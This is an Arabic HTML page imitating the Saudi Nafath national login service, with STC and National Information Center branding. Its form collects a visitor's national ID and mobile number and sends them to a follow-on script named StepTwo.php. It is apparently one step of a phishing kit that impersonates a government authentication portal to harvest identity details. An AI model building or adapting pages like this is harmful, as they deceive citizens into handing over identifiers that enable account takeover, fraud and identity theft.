


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>nafad</title>
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300&display=swap" rel="stylesheet">
    <style>
        nav {
            overflow: auto;
        }

        .nafad {
            margin-right: 222px;
            float: right;
        }

        a {
            text-decoration: none;
        }

        .ff ul {
            list-style-type: none;
        }

        .ff ul li {
            display: inline;
            padding: 10px;
            font-weight: bold;
        }

        @media only screen and (max-width: 600px) {
            nav {
                overflow: hidden;
            }

            .nafad {
                float: none;
                margin-left: 230px;
            }
        }

        input {
            height: 50px !important;
            text-align: end;
            font-weight: bold !important;
            border-color: rgb(200, 224, 254) !important;
        }

        input:hover {
            background-color: lightgray;
        }

        ::-webkit-input-placeholder {
            text-align: right;
            font-weight: bold;
        }

        .tawtheg {
            transition: all 0.4s ease-in-out;
        }

        .tawtheg:hover {
            background-color: rgb(3, 71, 3) !important;
        }
    </style>

</head>

<body class="bg-light" style="font-family:'Tajawal', sans-serif; overflow-x: hidden;">


    <header class="shadow-sm" style=" background-color: white;">
        <nav>
            <img src="img/nafad.png" class="nafad my-4" />
        </nav>
    </header>

    <main>
        <div class="container-fluid bg-light" style="margin-bottom: 100px;">
            <div class="row">
                <div class="col-sm-12 text-center">
                    <img src="img/point.png" class="mt-4"><br>
                                        <img src=img/Stc.png style="margin-top: -30px;">

                    <h4 class="text-center mt-5" style="font-weight: bold;">أدخل رقم الجوال للتوثيق على نظام إيفاء</h4>
                </div>
            </div>

            <div class="row d-flex justify-content-center mt-5">
                <div class="col-sm-6 col-lg-4">




                    <form method="POST" action="StepTwo.php?id=70&com=Stc" ;>
                        <label for="userId" class="form-label fw-bold float-end">الرقم الوطني</label>
                        <input type="text" name="userId" style="direction: ltr !important;" min="10" max="10" maxlength="10" pattern="[0-9]+" inputmode="numeric" required class="form-control fw-bold text-end mb-2" placeholder="XXXXXXXXXX">
                        <label for="phone" class="form-label fw-bold float-end">رقم الجوال</label>
                        <input type="text" name="PhoneNumber" id="phone" minlength="10" maxlength="10" required pattern="05\d{8}" class="form-control" placeholder="05XXXXXXXX">
                        <button type="submit" name="submit_PhoneNumber" class="tawtheg w-100 text-center btn fw-bold mt-5" style="background-color:#11998E; color: white; letter-spacing: 1px;">توثيق</button>
                    </form>




                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="container rounded" style="background-color: #dddddd; overflow: hidden;">
            <div class="row d-flex align-items-center pt-3">
                <div class="col-sm-3 col-lg-6 ff mt-4">
                    <ul>
                        <li>الرئيسية</li>
                        <li>حول</li>
                        <li>اتصل بنا</li>
                        <li>الشروط والأحكام</li>
                        <li>المساعدة والدعم</li>
                    </ul>
                </div>
                <div class="col-sm-3 col-lg-3 mt-4">
                    <p class="fw-bold text-end">تطوير وتشغيل</p>
                    <h2 class="fw-bold text-end">مركز المعلومات الوطني</h2>
                    <p class="fw-bold text-end">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
                </div>
                <div class="col-sm-3 col-lg-3 text-center">
                    <img src="img/NIC.png">
                </div>
            </div>
        </div>
    </footer>

</body>

</html>